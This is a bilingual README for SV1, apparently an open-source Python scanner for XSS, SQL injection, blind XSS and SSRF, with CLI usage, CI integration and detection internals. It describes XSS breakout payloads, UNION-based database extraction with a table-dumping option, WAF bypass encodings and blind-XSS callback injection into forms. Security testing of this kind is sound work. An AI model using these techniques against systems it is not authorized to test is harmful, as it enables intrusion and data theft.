[English](README.md) · **العربية**

# SV1 — BY ee.zvz

**SV1** is a Python XSS / SQL injection / blind XSS / SSRF scanner for Windows 11.
It proves execution inside Chromium, catches out-of-band callbacks, crawls SPAs,
imports OpenAPI, and ships CI output: SARIF, severity gates, scoped scans, and
SQLite session history. Release `1.6.1` repairs the proof gate for **Coverage
2.0**: the full lab now proves path-segment, header and cookie XSS in Chromium
(`--path --headers --cookies`) instead of re-running the old 34-point set.
`1.6.0` added Coverage 2.0: `--path` turns every URL path segment into a
replayable point; `--headers` and `--cookies` follow every discovered page and
header/cookie XSS can be proved in Chromium; an explicit `--scope` can authorize
an API/SPA origin without sending the target session there; one passive GET
fingerprints a named WAF; and findings map to OWASP Top 10:2025. The reflected
recall remains **43/43 GET pages**, now re-measured on 1.6.1. The previous release
`1.5.2` يغلق فجوتَي الاسترجاع في الـpayloads:
`data:text/javascript` لـ`<script src>` وevent handler بلا اقتباسات للـattribute
العاري؛ الجدول المصحح **43/43 صفحة GET**. `1.5.1` hardens checkpoint handling
and the authenticated/sitemap lab proof; `1.5.0` adds the real-world operating layer:
same-origin form login with CSRF preservation, resumable point scans, robots and
sitemap discovery, and CWE/OWASP/remediation metadata in every output. It keeps
the `1.4.0` inputs: HAR and raw HTTP request import, nested JSON and raw bodies,
XHR/fetch POST capture, same-origin external JavaScript analysis, nested OpenAPI
bodies, multipart text fields, OpenAPI path parameters, hidden/password opt-in,
and target-scoped Playwright storage state.
Reflection alone stays `MEDIUM`; `HIGH` needs execution.
`1.3.1` added exact dependency pins, a `pyproject.toml`, a full-lab CI gate, and
replay-enabled Altoro evidence. `1.3.2` added one version source, ruff/mypy and
coverage gates, and a same-target comparison against dalfox and sqlmap.
`1.3.3` hardened redirect scope and split confirmed from replayed proof. `1.3.4`
adds server-set cookie isolation, baseline-aware SQLi replay, blind script-only
demotion, and stored-XSS payload fallback. `1.3.5` blocks cross-origin request
bodies, canonicalizes scope paths and IPv6, imports the live HTTP session into
Chromium, and refreshes the build dependencies. `1.4.0` adds multipart points and
browser replay, OpenAPI path injection, preserved hidden/password fields with
explicit opt-in, session-aware curl, and `--storage-state` /
`--save-storage-state` for authenticated scans. `1.5.0` adds login through a
same-origin form, checkpointed `--resume`, sitemap seeds and CWE/OWASP/remediation
metadata. `1.5.1` يجعل ملفات checkpoint بمود `0600`، ويحذر أن ملف `--resume` مادة
جلسة، ويضيف `/private` المحمي بالدخول و`/orphan` القادم من sitemap إلى دليل
المختبر الكامل، ويرفع أرضية التغطية إلى 51.0%.
راجع مراجعة السوق في [`docs/IMPROVEMENTS.ar.md`](docs/IMPROVEMENTS.ar.md).

أداة فحص ثغرات **XSS** و **SQL Injection** و **Blind XSS** و **SSRF** مكتوبة
ببايثون، تشتغل على ويندوز 11. عند التشغيل تطلع مقدمة متحركة (لوقو SV1 بتدرّج
لوني + اسم المؤلف) ثم يبدأ الفحص.

### مدخلات تطبيقات حقيقية (1.3.1)

- **استيراد HAR** (`--har`): كوكيز وهيدرات وأجسام طلبات same-origin تتحول
  لجلسة ونقاط حقن. قيم CLI تتغلب على قيم الملف، والملف لقطة ثابتة.
- **استيراد طلب خام** (`--request`): method وpath وهيدرات وجسم من طلب واحد.
- **JSON متداخل** (`--json`, `--har`, `--request`, `--spa`, `--openapi`): كل ورقة scalar
  تصير نقطة (`user.name`, `items[0].id`)، والقالب الأصلي يُعاد بناؤه لكل طلب.
- **جسم خام وmethod صريح**: `--data` يقبل JSON أو قالباً فيه `*` (أول علامة)،
  و`--method` و`--content-type` يضبطان الطلب.
- **التقاط XHR/fetch POST** في `--spa`: method والجسم ونوع المحتوى؛ JSON و
  form-urlencoded يتحولان لنقاط. سقف الجسم 200KB و40 نقطة.
- **سكربتات خارجية** (`--external-js`): حتى 4 ملفات same-origin لكل صفحة
  (1.5MB لكل ملف)، تحليل source/sink وإثبات في Chromium.
- **OpenAPI متداخل**: مخططات JSON داخل `requestBody` تتوسع كائنات ومصفوفات.
- **صدق الشدة**: XSS المنعكس يبدأ `MEDIUM`؛ `HIGH` فقط بعد تنفيذ Chromium.

### تسجيل الدخول والاستكمال والاكتشاف (1.5.0)

- **`--login URL` يسجّل الدخول من نموذج الهدف نفسه.** يجد نموذج POST على نفس
  الأصل فيه حقل password، يحافظ على hidden CSRF، ويرسل البيانات مرة واحدة.
  الكوكيز تنتقل إلى Chromium، فيجري إثبات التنفيذ داخل جلسة مسجّلة. إذا فشل
  الدخول أو غاب `--login-check` الموثوق، لا يستمر الفحص بصمت.
- **نموذج الدخول لا يُهاجم افتراضياً.** حقن اسم المستخدم قد يقفل الحساب، لذا
  يُستبعد من النقاط ومن مراحل stored/blind/second-order؛ `--login-attack` هو
  الخيار الصريح. إذا كان `--scope` فعالاً فيجب أن يكون رابط الدخول داخله.
  OAuth وSSO وتسجيل الدخول المعتمد على JavaScript أو MFA يحتاج
  `--storage-state` أو HAR أو تسلسل متصفح مسجّل.
- **`--resume FILE` يستكمل مرحلة النقاط.** يكتب JSON ذرّياً بعد كل نقطة،
  ويتحقق من الهدف وخيارات الفحص واكتشاف النقاط، ويتجاوز المفاتيح المكتملة ويعيد
  النتائج مع إعادة التحقق من إثبات المتصفح. مراحل
  browser/DOM/stored/blind/replay تُعاد لأنها تعتمد على الصفحة والـcallbacks
  الحية. وعاء الكوكيز لا يُحفظ في الملف، لكن نقاط الهيدرات وأوامر curl قد تحمل
  كوكيز، فالملف مواد جلسة لا ملف تقدّم. أكمل فحصاً مسجّلاً بنفس خيارات `--login`؛ والملف
  يرفض خلط فحص مسجّل بفحص مجهول. هذا استكمال نقاط، ليس محرك async موزّعاً.
- **`--sitemap` يضيف بذوراً لا صلاحيات.** يقرأ `robots.txt` ويتبع حتى ثلاثة
  ملفات sitemap على نفس الأصل ومستوى فهرس واحد، ويتخطى الأصول والمواقع
  الخارجية. حدود الصفحات والعمق والنطاق تبقى كما هي.
- **كل نتيجة جاهزة للتذكرة.** XSS/SQLI/SSRF تحمل CWE وOWASP 2021 واقتراح إصلاح
  في الكونسول وHTML وJSON وCSV وSARIF، دون تغيير الشدة.

### دقة النماذج والجلسة (1.4.0)

- **`multipart/form-data` مدعوم من البداية للنهاية.** النموذج المباشر، أو جسم
  XHR/fetch الذي يلتقطه `--spa`، أو HAR/طلب خام يتحول إلى نقاط على حقول النص.
  أجزاء الملفات تُتخطى ولا تُخمّن. الإرسال وإثبات المتصفح يحافظان على ترميز
  multipart، وcurl يستخدم `-F`.
- **معاملات مسار OpenAPI نقاط حقن حقيقية.** `/users/{id}` ينتج نقطة لـ `id`،
  والنتيجة تحتفظ بالـ placeholder للعرض، بينما كل طلب وإثبات وcurl يبني المسار
  الفعلي ويرمّزه.
- **الحقول المخفية وكلمات المرور تُحفظ ولا تُهاجم افتراضياً.** توكن CSRF أو قيمة
  تسجيل الدخول تُرسل دائماً مع النموذج حتى لا يفشل الإثبات. `--hidden-fields`
  و`--password-fields` يفعّلان مهاجمتها صراحةً.
- **إثبات واعٍ بالأصل.** إثبات نموذج المتصفح يفتح أصل الهدف أولاً، ثم يرسل
  النموذج المحقون بـ `Origin` و`Referer` وكوكيز الهدف. الطلبات غير الآمنة من
  نفس الهدف تأخذ نفس الهيدرات، لذا يقبل CSRF middleware التوكن المحفوظ.
- **حالة التخزين محصورة بالهدف.** `--storage-state FILE` يحمّل كوكيز الهدف في
  عميل HTTP، وكوكيز الهدف + localStorage في Chromium. `--save-storage-state
  FILE` يصدّر الحالة بعد الإثبات. الكوكيز لازم تطابق مضيف الهدف، وlocalStorage
  لازم يطابق الأصل بالضبط، والمنتهية أو `Secure` على HTTP تُسقط. لا تُنسخ حالة
  طرف ثالث داخل أو خارج.
- **curl واعٍ بالجلسة.** أوامر الإعادة تستخدم كوكيز الهدف وهيدرات الجلسة الحية،
  وتعيد بناء أجسام JSON، وتحافظ على أجزاء multipart، وترمّز قيم المسار.

### أمان وصحة (1.2.1)

- **علم TLS ما عاد معكوساً.** `-k/--insecure` الحين يضبط
  `ignore_https_errors=True` في Chromium. قبل 1.2.1 كان العلم معكوساً: `-k`
  يبقي أخطاء الشهادة قاتلة، والافتراضي يتجاهلها بصمت.
- **النماذج تبقى على الهدف.** إجراء النموذج لازم يكون HTTP(S) وبنفس الأصل قبل
  تحويله لنقطة فحص، وقبل إرسال stored/second-order، وقبل إرسال المتصفح. صفحة
  خبيثة ما تقدر تحوّل هيدرات الفحص أو البايلودات لجهة ثالثة عبر
  `<form action>`.
- **طلبات متوازية بلا جلسة مشتركة.** كل خيط يأخذ `requests.Session` ومجمع
  اتصالات خاص فيه، وكل الجلسات تتشارك cookie jar واحداً آمناً للخيوط. كوكيز
  تسجيل الدخول تنتقل، لكن حالة المحول ومجمع الاتصالات ما تنعدّل بالتزامن.
- **أساس SQLi يستخدم التكرار المقصود.** إذا تكرر اسم المعامل
  (`id=1&id=2`)، إعادة التشغيل تقارن قيمة `param_index` المقصودة، مو أول قيمة
  بنفس الاسم.
- **الدليل المنشور هو JSON النتيجة.** ملفات الصور مو أصول إصدار؛ الماركر
  المنفّذ و`confidence` داخل النتيجة نفسها.

### دقة 1.2.0

- **فهم القواعد، مو قائمة بايلودات.** ماسح HTML واحد يقرأ موضع الانعكاس: اسم
  الوسم، اسم الخاصية وقيمتها وعلامة الاقتباس، النص الخام (`title`, `textarea`,
  `style`)، داخل `<script>` (كود/نص/تعبير نمطي/تعليق)، أو تعليق HTML. وجود
  `<h1>` داخل قيمة خاصية مقتبسة ما يخدع الماسح كأنه وسم جديد.
- **بايلودات حسب السياق.** يغلق الخاصية أو الوسم أو عنصر النص الخام أو تركيب
  JavaScript المفتوح بالضبط. انعكاس داخل معالج حدث يستخدم `alert(/token/)`
  بلا اقتباسات حتى لا يكسره سيرفر يهرّب علامات الاقتباس.
- **إثبات المتصفح يجرّب بدائل.** حتى 6 بايلودات منعكسة لكل نقطة، ويقرأ الصفحة
  وكل إطار فرعي، فـ `iframe srcdoc` و`srcdoc` المحقون يُثبتان لا يُخمّنان.
  عند توفر Chromium، `HIGH` يحتاج تنفيذًا فعليًا؛ الانعكاس الحرفي بدون تنفيذ
  يبقى `MEDIUM`. بدون متصفح النتيجة انعكاس فقط.
- **أمانة الطلب.** أسماء المعاملات المكررة تبقى محفوظة، و`param_index` يعني
  تكرار الاسم. المعامل الثاني مثل `?id=1&name=test` يُستبدل فعليًا بدل ما
  يُترك كما هو.
- **إعادة إنتاج.** نتائج XSS المنعكس وSQLi وSSRF تحمل أمر `curl`، ويظهر في
  الطرفية وHTML وJSON وCSV. إثباتات المتصفح فقط (DOM، مخزّن، أعمى) تكتب صورة
  محلية وتسجّل الماركر المنفّذ داخل النتيجة؛ JSON هو الدليل المنشور.
- **تقرير آمن.** ANSI ووحدات التحكم وبادئات صيغ CSV والوسوم تُعقَّم قبل العرض.
- **غير HTML/XML ليس XSS.** ردود `text/plain` وJSON وغيرها ليست مرشحة لـ XSS.

الأدلة الكاملة: [`docs/REALWORLD.md`](docs/REALWORLD.md).

---

## التنصيب

يتطلب **Python 3.10+**.

```powershell
cd sv1
python -m pip install -r requirements.txt
python -m playwright install chromium
```

`requirements.txt` و`pyproject.toml` يثبتان إصدارات دقيقة؛
`python -m pip install .` يستخدم نفس مجموعة الاعتماديات. الإصدار مصدره الوحيد
`sv1lib/version.py`، ويقرأ منه `User-Agent` وبيانات الحزمة.

للمساهمين:

```powershell
python -m pip install -r requirements.txt -r requirements-dev.txt
python -m ruff check .
python -m mypy
python -m coverage run -m unittest discover -s tests
python -m coverage report -m
```

نفس الفحوصات تعمل في مهمة `quality` داخل CI. التفاصيل:
[`docs/QUALITY.md`](docs/QUALITY.md).

خطوة المتصفح اختيارية لكن مطلوبة لإثبات التنفيذ (XSS حقيقي، DOM، Stored)،
ولزيارة صفحة المشرف في Blind XSS، ولزحف SPA. بدونها الأداة تشتغل وتفحص
الانعكاس و SQLi و blind callback و SSRF بشكل عادي.

التشغيل السريع:

```powershell
.\run.bat -u http://target.tld --crawl
```

`run.bat` يسوي بيئة افتراضية `.venv` تلقائياً أول مرة، وينزّل المتطلبات، ويشغّل الأداة.

> للمقدمة المتحركة استخدم **Windows Terminal** (يدعم ألوان 24-bit والرموز).

---

## الاستخدام

```powershell
python sv1.py -u <URL> [خيارات]
```

| الخيار | المعنى |
|---|---|
| `-u, --url` | الهدف (مطلوب). يقبل بدون `http://` ويضيفه تلقائياً |
| `--crawl` | يتبع الروابط من الصفحة |
| `--depth N` | عمق الزحف (افتراضي 2) |
| `--pages N` | أقصى عدد صفحات (افتراضي 25) |
| `--threads N` | عدد الخيوط (افتراضي 8) |
| `--timeout S` | مهلة الطلب بالثواني (افتراضي 12) |
| `--rps N` | حد الطلبات بالثانية (افتراضي 8، `0` = بلا حد) |
| `--fail-on LEVEL` | متى يرجع الكود 1: `any` (افتراضي)، `none`، `low`، `medium`، `high`، `critical` |
| `--scope FILE` | ملف allowlist للنطاقات/المسارات؛ أي شيء خارجه يُرفض |
| `--db FILE` | قاعدة SQLite لحفظ الجلسات والنتائج |
| `--diff` | مقارنة الجلسة الحالية بالسابقة في `--db` |
| `--retest` | إعادة فحص نتائج الجلسة المحفوظة بدل الزحف |
| `--sarif FILE` | تقرير SARIF 2.1.0 للـ CI |
| `--xss` | فحص XSS فقط |
| `--sqli` | فحص SQLi فقط |
| `--no-xss` / `--no-sqli` | تعطيل أحد الفحصين |
| `--time` | تشغيل فحص الحقن الزمني (بطيء، دقيق) |
| `--no-union` | تعطيل استخراج UNION |
| `--headers` | حقن في `X-Forwarded-For` و `Referer` و `User-Agent` |
| `--deep` | هيدرات إضافية: `X-Real-IP`, `Client-IP`, `Origin` … |
| `--cookies` | حقن في قيم الكوكيز الممررة بـ `--cookie` |
| `--json URL` | فحص حقن JSON؛ الكائنات والمصفوفات المتداخلة تتحول لنقاط أوراق |
| `--json-data JSON` | قالب جسم JSON (افتراضي `{"id": "1", "q": "test"}`) |
| `--data BODY` | قالب جسم خام؛ `*` علامة الحقن، أو JSON لفحص الأوراق المتداخلة |
| `--method METHOD` | method لـ `--data`/`--json` (افتراضي `POST`) |
| `--content-type TYPE` | نوع المحتوى لـ `--data`/`--json` |
| `--har FILE` | استيراد كوكيز وهيدرات ونقاط من ملف HAR |
| `--request FILE` | استيراد طلب HTTP خام واحد (method/path/headers/body) |
| `--storage-state FILE` | تحميل كوكيز + localStorage من Playwright محصورة بالهدف |
| `--save-storage-state FILE` | حفظ حالة المتصفح المحصورة بالهدف بعد الفحص |
| `--login [URL]` | تسجيل الدخول من نموذج POST على نفس الأصل قبل الزحف؛ بلا URL يستخدم الهدف |
| `--username USER` | اسم المستخدم، أو من `SV1_USERNAME` |
| `--password PASS` | كلمة المرور، أو من `SV1_PASSWORD` (أفضل) |
| `--login-user-field NAME` | اسم حقل المستخدم صراحةً |
| `--login-pass-field NAME` | اسم حقل كلمة المرور صراحةً |
| `--login-check TEXT` | اشترط ظهور هذا النص بعد الدخول |
| `--login-attack` | اسمح بمهاجمة حقل المستخدم أيضاً (متوقف افتراضياً) |
| `--sitemap` | بذور زحف من `robots.txt` وملفات sitemap على نفس الأصل |
| `--resume FILE` | استكمال مرحلة النقاط من checkpoint ذرّي |
| `--hidden-fields` | فحص الحقول المخفية أيضاً (قيمها محفوظة افتراضياً) |
| `--password-fields` | فحص حقول كلمة المرور أيضاً (متوقف افتراضياً) |
| `--external-js` | قراءة سكربتات same-origin خارجية لتحليل DOM source/sink |
| `--params` | اكتشاف باراميترات GET مخفية على عنوان الهدف |
| `--js` | استخراج نقاط حقن من سكربتات الصفحات |
| `--second-order` | فحص SQLi من الدرجة الثانية (يكتب في الهدف) |
| `--dump` | سحب هوية القاعدة وأسماء الجداول بعد نجاح UNION |
| `--spa` | زحف SPA: تحميل الصفحات في Chromium والتقاط روابط وأجسام XHR/fetch POST |
| `--openapi SPEC` | استيراد نقاط الحقن من ملف أو رابط OpenAPI JSON |
| `--blind` | Blind XSS: يحقن سكربت callback في نماذج POST وينتظر اتصالاً (يكتب في الهدف) |
| `--blind-visit URL` | يفتح صفحة المشرف بعد الحقن، يتكرر (محاكاة محلية) |
| `--ssrf` | يفحص الباراميترات الشبيهة بالروابط عبر callback |
| `--oob BASE` | عنوان callback العام (افتراضي `http://127.0.0.1:8777`) |
| `--oob-bind HOST:PORT` | عنوان الاستماع للـ callback (افتراضي `127.0.0.1:8777`) |
| `--oob-wait S` | ثواني انتظار callback بعد الفحص (افتراضي 8) |
| `--browser` | إجبار إثبات التنفيذ في Chromium |
| `--no-browser` | تعطيل المتصفح كلياً |
| `--stored` | فحص XSS المخزّن (يكتب بيانات في الهدف) |
| `--artifacts DIR` | مجلد صور الإثبات (افتراضي `sv1-artifacts`) |
| `--html FILE` | تقرير HTML بالصور |
| `-H "Key: Value"` | هيدر إضافي، يتكرر |
| `--cookie "sid=abc"` | كوكيز الجلسة |
| `--proxy URL` | بروكسي |
| `-k, --insecure` | تجاهل شهادة TLS |
| `-o FILE` | تصدير النتائج `.json` أو `.csv` |
| `--no-verify` | تخطي مرحلة إعادة التشغيل (replay) |
| `--no-banner` | تخطي المقدمة |
| `--version` | طباعة الإصدار |
| `-v` | إظهار أخطاء الشبكة والأخطاء الداخلية |

### أمثلة

```powershell
# موقع كامل، فحص كامل + تقرير بالصور
python sv1.py -u https://site.tld --crawl --html report.html -o report.json

# صفحة بحث واحدة، XSS فقط
python sv1.py -u "https://site.tld/search?q=test" --xss

# نقطة ID مع فحص زمني وجلسة مسجلة
python sv1.py -u "https://site.tld/item?id=1" --sqli --time --cookie "PHPSESSID=abc123"

# فحص مخزّن (يكتب في الهدف) مع صور الإثبات
python sv1.py -u https://site.tld --crawl --stored --html report.html

# بلا متصفح (أسرع، بلا إثبات تنفيذ)
python sv1.py -u https://site.tld --crawl --no-browser

# حقن الهيدرات والكوكيز (تختبر عنوان الهدف نفسه)
python sv1.py -u https://site.tld/api/account --headers --deep --cookies --cookie "sid=abc"

# واجهة JSON (PowerShell يشيل التنصيص الداخلي، لذا استخدم backtick)
python sv1.py -u https://site.tld/api/item --json https://site.tld/api/item `
  --json-data "{\`"id\`": 1, \`"q\`": \`"test\`", \`"user\`": {\`"name\`": \`"guest\`"}}"

# استخدم جلسة HAR وطلباتها المحفوظة
python sv1.py -u https://site.tld --har session.har --xss --sqli

# طلب HTTP خام واحد، مع جسمه وهيدراته
python sv1.py -u https://site.tld --request request.txt

# تسجيل دخول مرة واحدة ثم زحف السطح المحمي
$env:SV1_USERNAME = "operator"
$env:SV1_PASSWORD = "correct horse battery staple"
python sv1.py -u https://app.tld/dashboard --login https://app.tld/login `
  --login-check "Sign out" --crawl --xss --sqli

# بذور زحف من robots.txt / sitemap.xml
python sv1.py -u https://site.tld --crawl --sitemap

# استكمال مرحلة النقاط بعد انقطاع
python sv1.py -u https://site.tld --crawl --xss --sqli --resume scan.json
python sv1.py -u https://site.tld --crawl --xss --sqli --resume scan.json

# قالب جسم خام: أول * فقط يصير بايلود
python sv1.py -u https://site.tld/api/search --method POST `
  --content-type "application/x-www-form-urlencoded" --data "q=*&page=2"

# التقاط XHR/fetch POST أثناء زحف SPA
python sv1.py -u https://site.tld/app --spa --xss

# تحليل سكربت خارجي same-origin مع إثبات المتصفح
python sv1.py -u https://site.tld/app --external-js --xss

# باراميترات مخفية على صفحة واحدة
python sv1.py -u https://site.tld/export --params

# نقاط من JavaScript + SQLi من الدرجة الثانية
python sv1.py -u https://site.tld --crawl --js --second-order

# سحب هوية القاعدة وأسماء الجداول بعد إثبات UNION
python sv1.py -u "https://site.tld/item?id=1" --dump

# زحف SPA + استيراد مواصفات OpenAPI
python sv1.py -u https://site.tld --crawl --spa --openapi https://site.tld/openapi.json

# Blind XSS: احقن في النماذج، ثم افتح صفحة المشرف (محاكاة محلية)
python sv1.py -u https://site.tld/contact --blind `
  --blind-visit https://site.tld/admin/messages --html report.html

# SSRF: باراميتر URL يطلب عنوان الـ callback
python sv1.py -u "https://site.tld/fetch?url=x" --ssrf

# CI: SARIF + فشل فقط عند HIGH أو أعلى
python sv1.py -u https://site.tld --crawl --sarif sv1.sarif --fail-on high

# نطاق محدد من ملف + تاريخ + diff بين الجلسات
python sv1.py -u https://site.tld --crawl --scope scope.txt `
  --db sv1-history.db --diff --fail-on high

# إعادة فحص نتائج الجلسة السابقة (بدون زحف)
python sv1.py -u https://site.tld --db sv1-history.db --retest --fail-on high

# هدف بعيد: لازم callback عام يوصل للـ listener (نفق/بروكسي عكسي)
python sv1.py -u https://site.tld --blind --oob https://cb.example.tld `
  --oob-bind 0.0.0.0:8777 --oob-wait 30
```

مخرجات الأداة: صفر = ما فيه نتائج (أو `--fail-on none`)، واحد = فيه نتيجة
عند/فوق عتبة `--fail-on`، اثنان = الهدف ما استجاب أو فشل فتح الملفات.

---

## CI والذاكرة (P5)

### SARIF و`--fail-on`

```powershell
python sv1.py -u https://site.tld --crawl `
  --sarif sv1.sarif --fail-on high
```

- `--sarif` يكتب SARIF 2.1.0: قاعدة لكل `kind/technique`، نتيجة لكل finding،
  بصمة ثابتة (`sv1Fingerprint`) وموقع ودرجة أمان. يصلح للرفع إلى GitHub code
  scanning أو أي أداة تقرأ SARIF.
- `--fail-on` يحدد كود الخروج فقط، ما يخفي النتائج:
  - `any` (الافتراضي): 1 إذا فيه أي نتيجة.
  - `none`: 0 دائماً مع بقاء التقرير.
  - `low/medium/high/critical`: 1 إذا فيه نتيجة عند العتبة أو أعلى.
  - 2 يبقى للهدف غير القابل للوصول أو فشل الكتابة.
- عتبة `high` لا تفشل على MEDIUM، وعتبة `critical` لا تفشل على HIGH.
- مثال CI:

```yaml
- run: python sv1.py -u "$TARGET" --crawl --sarif sv1.sarif --fail-on high
- uses: github/codeql-action/upload-sarif@v3
  if: always()
  with:
    sarif_file: sv1.sarif
```

### ملف النطاق `--scope`

```text
# scope.txt
example.com
*.example.com
https://api.example.com/v1/*
127.0.0.1:8099
```

- سطر لكل قاعدة، `#` للتعليق، و`*` wildcard في المضيف أو المسار.
- لازم الهدف نفسه يطابق قاعدة، وإلا يتوقف الفحص بكود 2.
- بدون `--scope`، نطاق الهدف هو القائمة الكاملة، مع استثناء واحد: ترقية
  same-host من HTTP إلى HTTPS. أي redirect لنطاق آخر يُرفض. مع ملف scope،
  تُفحص كل قفزة تحويل والتنقل العلوي في المتصفح قبل الإرسال.
- جسم الطلب لا يُنقل عبر أصل آخر: `307/308` يحافظان على method والجسم، و
  `301/302` يحافظان على جسم غير POST مثل `PUT`، لذلك تُرفض القفزة قبل إرسال
  البايتات. القفزة bodyless من نوع GET/HEAD تبقى مسموحة.
- مطابقة المسار تطبّع `..` والشرطة المزدوجة وbackslash وpercent-encoding قبل
  المقارنة، فلا يمر `/app/../admin` أو `%2e%2e` بقاعدة `/app/*`. قاعدة URL
  بلا منفذ تستخدم منفذ المخطط الافتراضي، والمضيف المجرد يبقى any-port. قواعد
  IPv6 بصيغة `[::1]:8099` تُقرأ كمضيف ومنفذ لا كمضيف واحد.
- النطاق يسمح بالوصول، لا بالأسرار: هيدرات الجلسة والكوكيز المستوردة تُرسل
  للهدف فقط. القفزة المسموحة عبر النطاق تكون بلا جلسة. Chromium يرفض كذلك أي
  POST يحمل جسماً إلى هدف آخر، ويستورد كوكيز جلسة HTTP الحية قبل الإثبات.
- الملف يحدد ما يُفحص، وليس جدار شبكة: صفحات SPA قد تطلب أصولاً خارجية أثناء
  العرض، لكن بدون هيدرات الجلسة. لا تعتمد عليه للحماية الشبكية.

### قاعدة الجلسات `--db` و`--diff`

```powershell
python sv1.py -u https://site.tld --crawl --db sv1.db --diff
```

- SQLite يحفظ كل جلسة وكل النتائج: الهدف، الوقت، الإصدار، الإحصاءات،
  البصمة، نقطة الحقن القابلة لإعادة الإرسال.
- `--diff` يقارن مع آخر جلسة لنفس الهدف:
  `+N new · N open · -N fixed`. البصمة تعتمد على النوع + طريقة HTTP + الرابط
  (بعد ترتيب query) + الباراميتر + تقنية الكشف، فالبايلود المتغير ما يخلق
  finding جديداً، لكن error وUNION على نفس النقطة يبقيان نتيجتين.
- الجلسة تُحفظ حتى لو كانت نظيفة، حتى يستطيع diff لاحق أن يثبت الإصلاح.
- `--retest` يقرأ آخر جلسة ويعيد إرسال النتائج القابلة لإعادة الإرسال فقط:
  XSS/SQLi error/boolean/time/second-order. لا يزحف ولا يعيد فحص OOB.
  نتائج Blind/SSRF/Stored/DOM/UNION تُعدّ `skipped` لأنها تحتاج متصفحاً أو
  استخراجاً كاملاً. استخدم نفس `-u` المستخدم في الجلسة الأصلية.
- إذا صار الهدف غير قابل للوصول، retest يعلّم النتائج `fixed` (لم تعد
  قابلة للإثبات) ويطبع العدد؛ هذا سلوك مقصود.

### 429 والتكيّف

حد `--rps` ما عاد ثابتاً فقط: عند `429/503` يضاعف SV1 الفاصل حتى 8 أضعاف،
ويحترم `Retry-After` الرقمي (بحد 30 ثانية)، ثم يعود تدريجياً بعد 20 رداً
سليماً. `--rps 0` يبقى بلا حد.

> 1.6.1 يصلح بوابة إثبات Coverage 2.0 ويشغّل `--path --headers --cookies` في
> المختبر الكامل. 1.6.0 أضاف path/header/cookie وscope وبصمة WAF. 1.5.1
> يصلّب checkpoint ويضيف دليل login/sitemap. 1.5.0 أضاف الدخول من نموذج
> same-origin، و`--resume` لمرحلة النقاط، وبذور sitemap، وتصنيف
> CWE/OWASP/الإصلاح. محرك async بـ `httpx` ما زال مؤجلاً.
> الإصدار 1.3.1 يضيف HAR والطلبات الخام وJSON المتداخل وأجسام XHR POST
> وسكربتات خارجية وOpenAPI متداخل، فوق دقة 1.2.0 وSARIF وfail-on وscope
> وSQLite diff/retest وتكيّف 429. CI يشغّل اختبار Chromium والمختبر الكامل.

---

## كيف يفحص

**الأساس: قياس الصفحة أولاً**
كل نقطة تُطلب مرتين بدون تعديل. تُقارن النسختان على مستوى التوكنز
(`difflib`) ويُقاس الضجيج: nonce، CSRF token، وقت، عداد. الضجيج يحدد
كل قرار بعده:

- `floor = 3 × noise` — أقل فرق يمكن تصديقه.
- الصفحة الثابتة: مقارنة واحدة.
- الصفحة المتغيرة: كل فرع يُعاد مرتين قبل المقارنة.

الصفحة التي يتجاوز ضجيجها 10% تُعامَل كغير موثوقة، وكل نتيجة عليها تنزل
درجة ثقة.

**XSS (منعكس)**
1. يرسل توكن عشوائي `sv1xxxxxxxx` في الباراميتر.
2. إذا ما رجع في الرد → لا انعكاس، يتخطاه. الردود غير HTML/XML ليست مرشحة.
3. يقرأ **قواعد** موضع الانعكاس: اسم الوسم، اسم الخاصية وقيمتها واقتباسها،
   النص الخام (`title`, `textarea`, `style`)، داخل `<script>` (كود/نص/تعبير
   نمطي/تعليق)، أو تعليق HTML.
4. يبني بايلودات مرتبة تقفل بالضبط ما هو مفتوح — مثلاً داخل
   `<script>var x = "..."` يستخدم `0";alert(tok)//`؛ داخل تعليق بلوك يقفل
   `*/` أولاً؛ داخل `value='...'` يقفل الخاصية والوسم؛ وداخل خاصية عنصر نص
   خام يقفل العنصر قبل حقن الوسم.
5. يتحقق أن البايلود رجع **حرفياً** في الرد. الانعكاس الحرفي يقترح نتيجة؛
   التشفير أو حذف الوسوم → `MEDIUM`.
6. Chromium يجرّب الأساسي وحتى 5 بدائل حرفية، ويفعّل
   `mouseover/focus/click`، ويقرأ كل إطار. فقط الماركر المنفّذ يبقي
   `HIGH` + `CONFIRMED`؛ الحرفي غير المنفّذ ينزل `MEDIUM` مع السبب.

**SQLi**
1. **Error-based** — بايلودات كاسرة + بصمات أخطاء 7 قواعد بيانات، مع
   استثناء الأخطاء الموجودة في الصفحة الأصلية.
2. **Boolean-based** — 6 أزواج (صح/خطأ)، ويقبل فقط إذا:
   الفرعان تكررا بنفس الشكل، «الصح» طابق الأصل، «الخطأ» خالفه، والفرق
   بينهما فوق أرضية الضجيج.
3. **Time-based** (`--time`) — SLEEP / WAITFOR / pg_sleep / DBMS_PIPE،
   بتأكيد مرتين وهامش فوق زمن الأصل.
4. **UNION + استخراج** — تُشغّل فقط على نقطة أثبتت الحقن أصلاً:
   - عدّ الأعمدة: `ORDER BY n` يفشل عند أول عمود زائد → بحث ثنائي.
   - تحديد العمود المرتجع: `UNION SELECT NULL,...,'sv1u...',...` حتى يظهر الماركر.
   - استخراج فعلي: `version()`، `@@version`، `sqlite_version()`،
     أو `v$version` لأوراكل. القيمة نفسها تُكتب في الدليل، والبصمة تحدد القاعدة.
   - `--dump`: يقرأ `current_user()` و`database()` وأسماء الجداول من كتالوج
     القاعدة عبر نفس العمود المرتجع. كل قيمة محاطة بماركر `sv1[...]sv1` حتى
     تُقتطع من الرد بلا تخمين؛ بحد 3 طلبات و12 جدولاً. مدعوم على
     MySQL/PostgreSQL/MSSQL/SQLite.
   - النتيجة `CRITICAL` و `CONFIRMED` — قرأنا من القاعدة، ما خمّنّا.

**تجاوز الفلاتر**
إذا رد الهدف على بايلود بـ `403/406/429`، تُعاد نفس الحقنة بصياغات أخرى:
مسافات على شكل `/**/`، تبويب `%09`، تبديل حالة الأحرف، وتشفير مزدوج.
البايلود اللي نجح فعلاً هو اللي يُحفظ في النتيجة، ومرحلة الـ replay تجرب
نفس الصياغات قبل ما تحكم على النتيجة بأنها غير مستقرة.

**مواقع الحقن**
- `query` و `form` — تلقائي من الزحف.
- `header` (`--headers`) — قيم الهيدرات المذكورة أعلاه على عنوان الهدف.
- `cookie` (`--cookies`) — كل كوكي ممرر بـ `--cookie`.
- `json` (`--json`) — كل مفتاح في جسم JSON، مع `Content-Type: application/json`.
- `js` (`--js`) — كل URL فيه query داخل `<script>` مضمّن أو ملف سكربت خارجي
  بنفس الأصل. يغطي `fetch` و `axios` و `$.ajax` و أي رابط مكتوب كنص.
